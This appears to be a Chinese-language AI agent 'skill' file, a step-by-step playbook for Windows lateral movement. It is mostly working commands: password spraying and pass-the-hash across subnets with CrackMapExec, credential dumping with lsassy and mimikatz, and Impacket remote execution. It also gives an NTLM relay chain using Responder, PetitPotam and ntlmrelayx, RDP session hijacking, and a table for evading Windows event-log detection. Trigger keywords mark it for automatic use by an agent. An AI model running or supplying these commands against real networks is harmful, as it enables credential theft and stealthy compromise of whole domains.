---
name: 横走
description: >-
 SMB/WMI/RDP 横向移动实战：CrackMapExec 批量碰撞、Impacket SMBExec/WMIExec/PSExec、
 Pass-the-Hash 横向、远程服务创建。
version: 1.0.0
---

> **武庸**
> 永生缥缈非我求，长生无为老愧羞。
> 凡夫俗子岂识我，非到末路不甘休！

# SMB 横向移动

## 触发条件

：
- 横向移动、内网扩散、SMB 横向
- CrackMapExec、CME、crackmapexec
- SMBExec、WMIExec、PsExec、Impacket
- Pass-the-Hash 横向、哈希碰撞 + 内网
- WinRM 登录、evil-winrm
- RDP 令牌窃取

---

## 1. CrackMapExec — 批量探测与碰撞

```bash
# ── 安装 ──
pipx install crackmapexec

# ── 基础：密码喷洒整个 C 段 ──
crackmapexec smb 192.168.1.0/24 -u Administrator -p 'Password1' --continue-on-success

# ── Pass-the-Hash（PtH）横向 ──
crackmapexec smb 192.168.1.0/24 -u Administrator -H aabbcc112233 --continue-on-success

# ── 枚举共享 ──
crackmapexec smb 192.168.1.100 -u lowpriv -p 'Pass' --shares

# ── 枚举本地管理员 ──
crackmapexec smb 192.168.1.100 -u admin -p 'Pass' --local-auth --sam

# ── 转储 LSA secrets ──
crackmapexec smb 192.168.1.100 -u admin -p 'Pass' --lsa

# ── 远程执行命令 ──
crackmapexec smb 192.168.1.100 -u admin -p 'Pass' -x 'whoami'
crackmapexec smb 192.168.1.100 -u admin -p 'Pass' -X 'Get-Process' # PowerShell

# ── 模块（lsassy / mimikatz）──
crackmapexec smb 192.168.1.100 -u admin -p 'Pass' -M lsassy
crackmapexec smb 192.168.1.100 -u admin -p 'Pass' -M mimikatz

# ── WinRM ──
crackmapexec winrm 192.168.1.0/24 -u admin -p 'Pass'
```

---

## 2. Impacket 套件横向移动

### 2.1 PSExec（创建服务，会留日志）

```bash
# 密码
psexec.py CORP.LOCAL/Administrator:'Pass'@192.168.1.100

# PtH
psexec.py -hashes :aabbcc112233 Administrator@192.168.1.100

# Kerberos
export KRB5CCNAME=/tmp/Administrator.ccache
psexec.py -k -no-pass CORP.LOCAL/Administrator@DC01.corp.local
```

### 2.2 SMBExec（无文件落地，较隐蔽）

```bash
smbexec.py CORP.LOCAL/Administrator:'Pass'@192.168.1.100
smbexec.py -hashes :aabbcc112233 Administrator@192.168.1.100
```

### 2.3 WMIExec（WMI，安静）

```bash
wmiexec.py CORP.LOCAL/Administrator:'Pass'@192.168.1.100
wmiexec.py -hashes :aabbcc112233 Administrator@192.168.1.100
# 执行单条命令
wmiexec.py CORP.LOCAL/admin:'Pass'@192.168.1.100 "cmd /c whoami"
```

### 2.4 AtExec（任务计划横向）

```bash
atexec.py CORP.LOCAL/Administrator:'Pass'@192.168.1.100 "cmd /c whoami > C:\Temp\out.txt"
```

### 2.5 DCOMExec（DCOM 横向）

```bash
dcomexec.py CORP.LOCAL/Administrator:'Pass'@192.168.1.100
```

---

## 3. Evil-WinRM（WinRM 5985/5986）

```bash
# 安装
gem install evil-winrm

# 密码
evil-winrm -i 192.168.1.100 -u Administrator -p 'Password1'

# PtH
evil-winrm -i 192.168.1.100 -u Administrator -H aabbcc112233

# 上传工具
evil-winrm -i <IP> -u admin -p 'Pass'
# 在会话中：
upload /local/mimikatz.exe C:\Temp\mimikatz.exe
download C:\Temp\lsass.dmp /local/
```

---

## 4. RDP 令牌窃取（已有 SYSTEM 权限）

```powershell
# 1. 查看 RDP 会话（已有管理员权限）
query user /server:<TARGET>

# 2. 使用 tscon 劫持会话（无需密码）
# 以 SYSTEM 权限运行
tscon <sessionID> /dest:<当前会话名>

# 3. mimikatz — 提取 RDP 凭证
.\mimikatz.exe "ts::logonpasswords" "exit"
```

---

## 5. 横向移动策略

```
已有 hash/密码
 │
 ├─ SMB 445 开放 → wmiexec / smbexec（安静）
 ├─ WinRM 5985 开放 → evil-winrm
 ├─ RDP 3389 开放 → xfreerdp + PtH / tscon 劫持
 └─ DCOM → dcomexec
 
批量碰撞内网
 → crackmapexec smb 网段 -u admin -H hash --continue-on-success
 → 标记 (Pwn3d!) 的主机 → 批量转储 --lsa / -M lsassy
```

---

## 6. NTLM Relay 完整攻击链

### 6.1 前置：扫描无 SMB 签名的目标

```bash
# nmap
nmap -Pn -sS -T4 --open --script smb-security-mode -p445 192.168.1.0/24

# CME（直接生成 relay 目标列表）
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

### 6.2 触发 NTLM 认证的方法

```bash
# 方法一：Responder（被动，等待网段内 LLMNR/NBNS 广播）
# ⚠️ 做 relay 时必须先关闭 Responder 的 SMB/HTTP，否则拦截自己导致 relay 失败
sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
# 或手动编辑 /usr/share/responder/Responder.conf → SMB = Off / HTTP = Off
responder -I eth0 -rdwv
# 默认捕获 NTLMv2 hash；不做 relay 时写到 /usr/share/responder/logs/
# 恢复：sed -i 's/SMB = Off/SMB = On/; s/HTTP = Off/HTTP = On/' /etc/responder/Responder.conf

# 方法二：PetitPotam（主动，强制目标 DC 发起 NTLM 认证）
python3 PetitPotam.py -d <domain> <攻击机IP> <目标IP>
# 需要 SMB 监听器（ntlmrelayx）同时运行

# 方法三：PrinterBug（SpoolService）
python3 printerbug.py '<domain>/<user>:<pass>'@<printer_ip> <攻击机IP>

# 方法四：mitm6（IPv6 DNS 欺骗，获取 NTLMv2）
mitm6 -d <domain>
# 同时运行 ntlmrelayx
```

### 6.3 ntlmrelayx relay 到不同目标

```bash
# relay 到 SMB（无签名机器，执行命令）
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"

# relay 到 LDAP（提升账户权限）
ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <lowpriv_user>

# relay 到 AD CS（获取证书 → 进一步拿 TGT）
ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
# 输出 base64 证书 → certipy auth 获取 hash

# relay 到 LDAPS + 委派（mitm6 配合）
ntlmrelayx.py -6 -wh <攻击机IP> -t ldaps://<DC_IP> --delegate-access
# 再用 getST.py 申请服务票据：
getST.py -spn cifs/<目标> <domain>/<netbios_name>\$ -impersonate Administrator
```

### 6.4 拿到 NTLMv2 hash 后离线破解

```bash
# hashcat
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt

# john
john --format=netntlmv2 ntlmv2.hash --wordlist=rockyou.txt
```

---

## 7. 检测规避

| 技术 | 产生日志 | 规避 |
|------|---------|------|
| PSExec | 事件 7045 (服务创建) | 改用 smbexec/wmiexec |
| WMIExec | 事件 4688 (子进程创建) | 换 DCOM/WinRM |
| PtH (NTLM) | 事件 4624 Logon Type 3 | 改用 Kerberos PtT |
| RDP | 事件 4624 Type 10 | 劫持现有会话 |

---

## 证据落盘

```bash
mkdir -p 案卷/<案卷>/接管/lateral/
# 记录：哪些 IP 被碰撞成功（Pwn3d!）、执行了哪些命令
crackmapexec smb ... 2>&1 | tee 案卷/<案卷>/lateral/cme_smb.txt
```

配套：`windows-ad-pentest` · `kerberos-attack` · `internal-tunnel` · `windows-lpe`

## 真源

- 手法：`传承/纵横天下.md`
- 工具：`python3 炼蛊房/ad_surface_check.py --help`
